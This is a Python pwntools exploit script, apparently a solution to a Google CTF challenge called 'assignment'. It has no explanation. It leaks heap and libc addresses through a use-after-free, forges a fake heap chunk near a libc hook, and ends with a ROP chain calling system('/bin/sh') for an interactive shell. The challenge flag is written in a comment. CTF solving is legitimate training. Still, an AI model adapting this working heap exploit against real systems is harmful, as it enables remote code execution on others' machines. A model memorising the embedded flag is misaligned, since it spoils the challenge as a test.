#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "assignment.ctfcompetition.com"
port = 1337

#CTF{d0nT_tHrOw_0u7_th1nG5_yoU_5ti11_u53}
r = remote(host,port)

def leak(): 
    r.recvuntil('> ')
    r.sendline('a.b="c"')
    for _ in xrange(16):
        r.recvuntil('> ')
        r.sendline('a=1') 
    r.recvuntil('> ')
    r.sendline('a=a+""') #trigger gc
    r.recvuntil('> ')
    r.sendline('a')
    data = r.recvuntil('> ')
    m = re.match('^(\d+)\n', data)
    assert m != None
    return int(m.group(1)) - 1

heap = leak() & 0xfffffffffffff000
print "heap: 0x%016x" % heap

r.sendline('b="1"')
r.recvuntil('> ')
r.sendline('b="1"')
r.recvuntil('> ')
r.sendline('b="1"')
r.recvuntil('> ')
r.sendline('b="1"')
r.recvuntil('> ')
r.sendline('b="1"')
r.recvuntil('> ')
r.sendline('b="1"')
r.recvuntil('> ')
r.sendline('b="1"')
r.recvuntil('> ')
r.sendline('b="1"')
r.recvuntil('> ')
r.sendline('e.f="%s"' % ('A' * 128))
r.recvuntil('> ')
r.sendline('e.f.e=1')
r.recvuntil('> ')
r.sendline('c.d="%s"' % ('A' * 128))
r.recvuntil('> ')
r.sendline('c.d.e=1')
r.recvuntil('> ')

r.sendline('b="%s"'% (p64(0x8) + p64(heap + 0x450)))
r.recvuntil('> ')
r.sendline('a.b="c"')
r.recvuntil('> ')
r.sendline('a=a.b+%d' % (heap + 0x560))
r.recvuntil('> ')
r.sendline('a')
data = r.recvuntil('> ')
libc = u64(data[2:10]) - 0x3C1763

print "libc: ", hex(libc)
print "heap: ", hex(heap)

r.sendline('a=1')
r.recvuntil('> ')
r.sendline('a=1')
r.recvuntil('> ')
r.sendline('a=1')
r.recvuntil('> ')
r.sendline('a=1')
r.recvuntil('> ')
r.sendline('a=1')
r.recvuntil('> ')
payload = ''
payload += ""
payload += p64(0x63)
payload += p64(heap+0x690)
payload += p64(0)
payload += p64(0)
payload += p64(1)
payload += p64(heap+0x6b0)
payload += p64(0)
payload += p64(0x21)
payload += p64(0x40)
payload += p64(heap+0x7d0)
payload += p64(0)
payload += p64(0x21)
r.sendline('b="%s"' % (payload.ljust(300, "a")))
r.recvuntil('> ')
r.sendline('a=%d'%(0xe0))
r.recvuntil('> ')
r.sendline('c.d.e="1"')
r.recvuntil('> ')
r.sendline('c=a+c')
r.recvuntil("> ")
payload = p64(0)*2 + p64(0) + p64(0x71) +p64(0)*12 + p64(0) +p64(0x21)+p64(0)*2+ p64(0) +p64(0x21)
r.sendline("f=\"" + payload + "\"")
r.recvuntil("> ")
r.sendline("f.v=3")
r.recvuntil("> ")
r.sendline("c.c.d=1")
r.recvuntil("> ")

fake_chunk = p64(0) + p64(0x71) + p64(libc+0x3c171d) + p64(0) + p64(0)*10 + p64(0) + p64(    0x21) + p64(0) + p64(0x21)
payload = p64(0)*2 + fake_chunk
#payload = p64(0)*2 + p64(0) + p64(0x71) + p64(libc+0x3c171d) + p64(0) + p64(0)*10 + p64(0) + p64(0x21) + p64(0) + p64(0x21)
r.sendline("p=\"" + payload.ljust(0x1f0,"d") + "\"")
r.recvuntil("> ")
r.sendline("o=\"" + "a"*0x60 + "\"")
r.recvuntil("> ")
add_rsp = libc + 0x8b9ee
pop_rdi = libc + 0x0000000000022b9a
sh = libc + 0x180103
system = libc + 0x46590
payload = "a"*19 + p64(add_rsp) + "a"*10 + p64(pop_rdi) + p64(sh) + p64(system) 
r.sendline("r=\"" + payload.ljust(0x60,"\x41")  + "\"")
r.interactive()
